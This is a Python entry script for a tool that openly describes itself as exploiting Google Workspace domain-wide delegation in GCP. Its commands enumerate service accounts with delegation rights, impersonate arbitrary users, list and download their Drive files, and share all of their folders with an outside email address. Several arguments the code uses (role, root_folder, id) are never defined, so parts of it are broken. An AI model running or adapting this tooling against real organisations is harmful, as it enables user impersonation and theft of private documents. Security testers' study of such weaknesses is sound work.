import os 
import sys
import csv
import traceback
from src.gcp_sa_enum import ServiceAccountEnumerator
from checkdelegation import CustomCredentials, check
from utils.text_color import print_color
import argparse
from drive_manager import DriveManager

def check_gcp_bearer_access_token(testEmail, verbose, enum_output):
    token = os.environ.get('GCP_BEARER_ACCESS_TOKEN')
    if token:
        try:
            credentials = CustomCredentials(token)
            enumerator = ServiceAccountEnumerator(credentials, verbose=verbose)
            if enumerator.user_email == None:
                raise Exception(print_color("[-] Error verifying token. Ensure it's refreshed.", color="red"))
            print_color(f"✓ GCP_BEARER_ACCESS_TOKEN is set with access token of {enumerator.user_email}", color="green")
            check(enumerator, testEmail, verbose, enum_output)
        except Exception as e:
            print(f"An error occurred: {e}")
            print(traceback.format_exc())
    else:
        print_color("GCP_BEARER_ACCESS_TOKEN environment variable is not set. This tool requires an access token for "
                   "a user with the iam.ServiceAccountKeys.create permission.", color="red")
        sys.exit(1)

def handle_drive_commands(args):
    """Handle all drive-related commands
    
    Args:
        args: Parsed command line arguments
    """
    try:
        # Initialize DriveManager with service account file
        drive_manager = DriveManager(service_account_file=args.key_file)
        
        # Get access token for impersonation
        access_token = drive_manager.get_access_token(args.impersonate)
        
        # Initialize the Drive service
        drive_manager.initialize_service(access_token)
        
        if args.download:
            if not args.id:
                print_color("Error: Must provide a file id with --id argument when using --download", color="red")
                sys.exit(1)
            drive_manager.download_file(args.id)
            
        elif args.list:
            # Initialize CSV if output file specified
            if args.output:
                with open(args.output, mode='w', newline='') as csv_file:
                    writer = csv.writer(csv_file)
                    writer.writerow(['File', 'ID', 'Size', 'Trashed', 'Extension'])
            
            # List files (either in specific folder or all)
            drive_manager.list_files(args.output, args.folder)
            
        elif args.sharefolders:
            # Share all folders with the specified user
            print_color(f"\nStarting folder sharing process...", color="cyan")
            total, success, failed = drive_manager.share_all_folders(
                target_email=args.sharefolders,
                role=args.role,
                root_folder=args.root_folder
            )
            
    except Exception as e:
        print_color(f"An error occurred: {str(e)}", color="red")
        print("Full traceback:")
        print(traceback.format_exc())
        sys.exit(1)

def main():
    try:
        parser = argparse.ArgumentParser(description='Exploit Domain-Wide Delegation in GCP')
        subparsers = parser.add_subparsers(dest='command', help='Available commands')
        subparsers.required = True

        # Enum command parser
        parser_enum = subparsers.add_parser('enum', 
            help='Enumerate GCP service accounts with DWD privileges.')
        parser_enum.add_argument('--verbose', action='store_true', default=False,
            help='Enable verbose output')
        parser_enum.add_argument('--email', type=str,
            help='Optional: Specify a single email to test DWD against instead of enumerating users')    
        parser_enum.add_argument('--output', action='store_true', default=False,
            help='Enable colored, formatted output in results.txt file') 

        # Drive command parser
        drive_parser = subparsers.add_parser('drive',
            help='Impersonate a user and perform actions on Google Drive.')
        group = drive_parser.add_mutually_exclusive_group(required=True)
        group.add_argument('--download', type=str, metavar='FILE_ID',
            help='Download a file from Google Drive')
        group.add_argument('--list', action='store_true',
            help='List all contents of Google Drive')
        group.add_argument('--sharefolders', type=str, metavar='TARGET_EMAIL',
            help='Share all folders with the specified target email')

        drive_parser.add_argument('--key-file', type=str, required=True,
            help='Path to service account JSON key file')
        drive_parser.add_argument('--impersonate', type=str, required=True,
            help='User to impersonate')
        drive_parser.add_argument('--output', type=str,
            help='Output CSV file for file listing')
        drive_parser.add_argument('--folder', type=str,
            help='List files in specific folder')

        args = parser.parse_args()

        if args.command == 'enum':
            check_gcp_bearer_access_token(args.email, args.verbose, args.output)
        elif args.command == 'drive':
            try:
                # Initialize DriveManager with service account file
                drive_manager = DriveManager(service_account_file=args.key_file)
                
                # Get access token for impersonation
                access_token = drive_manager.get_access_token(args.impersonate)
                
                # Initialize the Drive service
                drive_manager.initialize_service(access_token)
                
                if args.download:
                    drive_manager.download_file(args.download)
                elif args.list:
                    if args.output:
                        with open(args.output, mode='w', newline='') as csv_file:
                            writer = csv.writer(csv_file)
                            writer.writerow(['File', 'ID', 'Size', 'Trashed', 'Extension'])
                    drive_manager.list_files(args.output, args.folder)
                elif args.sharefolders:
                    print_color(f"\nStarting folder sharing process...", color="cyan")
                    total, success, failed = drive_manager.share_all_folders(
                        target_email=args.sharefolders,
                        role=args.role,
                        root_folder=args.root_folder
                    )
                    
            except Exception as e:
                print_color(f"An error occurred: {str(e)}", color="red")
                print("Full traceback:")
                print(traceback.format_exc())
                sys.exit(1)
        else:
            parser.print_help()
            
    except Exception as e:
        print_color("An unexpected error occurred:", color="red")
        print(traceback.format_exc())
        sys.exit(1)

if __name__ == "__main__":
    main()